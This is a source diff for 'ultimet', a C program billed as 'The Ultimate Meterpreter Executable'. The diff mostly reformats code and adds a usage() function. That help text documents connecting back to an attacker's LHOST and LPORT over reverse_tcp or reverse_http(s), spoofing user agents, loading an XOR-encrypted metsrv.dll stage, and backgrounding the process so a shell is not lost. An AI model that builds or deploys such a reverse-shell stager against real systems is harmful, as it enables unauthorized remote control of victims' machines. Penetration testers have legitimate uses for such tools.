@@ -1,6 +1,8 @@
 #include "main.h"
 DWORD err = 0;
 
+
+
 LONGLONG SizeFromName(LPCWSTR szFileName) // Returns a file's size from its filename, returns a LONGLONG, in case you have a LARGE LARGE file :)
 {
 	LARGE_INTEGER fileSize = {0};
@@ -61,7 +63,7 @@ DWORD CopyStageToBuffer(LPCWSTR szFileName, unsigned char** buffer)
 		CloseHandle(hfile);
 		exit(0);
 	}
-	
+
 	dprintf(L"[*] Copying file \"%s\" to buffer...\n", szFileName);
 	if( FALSE == ReadFile(hfile, *buffer, (DWORD)size, NULL, NULL) )
 	{
@@ -123,11 +125,35 @@ bool UnicodeToAnsi(char* ascii, const wchar_t* unicode)
 
 void print_header()
 {
-printf("\n\n****************************************************\n");
-printf(" [+] [ultimet] - The Ultimate Meterpreter Executable\n");
-printf(" [+] v0.1 pre-alpha\n");
-printf("****************************************************\n");
-printf("  -  http://eldeeb.net - @SheriefEldeeb\n");
-printf("  -  Made in Egypt :)\n");
-printf("     ================\n\n");
+	printf("\n\n****************************************************\n");
+	printf(" [+] [ultimet] - The Ultimate Meterpreter Executable\n");
+	printf(" [+] v0.1 pre-alpha\n");
+	printf("****************************************************\n");
+	printf("  -  http://eldeeb.net - @SheriefEldeeb\n\n");
+}
+void usage()
+{
+	printf(
+		"Usage:\n"
+		"utlimet.exe -h <LHOST> -p <LPORT> -t <TRANSPORT> [-f FILENAME] \n"
+
+		"\nMandatory switches:\n"
+		"\t-h\tLHOST\tIP or a hostname.\n"
+		"\t-p\tLPORT\tPort number, or corresponding service name \"like HTTP, FTP...etc.\"\n"
+		"\t-t\tTRANSPORT\tEither \"reverse_tcp\", \"reverse_http\" or \"reverse_https\".\n"
+
+		"\nHTTP(S) Specific parameters:\n"
+		"\t-ua\tU_AGENT\t User-Agent, enclose in `\"\"` if contains spaces.\n"
+		"\t-et\tSECONDS\t Session expiration timeout in seconds.\n"
+		"\t-ct\tSECONDS\t Communication expiration timeout in seconds.\n\n"
+
+		"Stage loading options:\n"
+		"\t-f\tFILE\tForces loading the stage from a file.\n"
+		"\t\t\tNote: The file can be a regular metsrv.dll,\n"
+		"\t\t\tor an encrypted one using the ultimet_xor.exe utility.\n"
+
+		"\n - If you're on a shell [not a console], you have to start the program using:\n"
+		"  \"start /b ultimet.exe ...\" or you'll lose your shell.\n"
+
+		);
 }
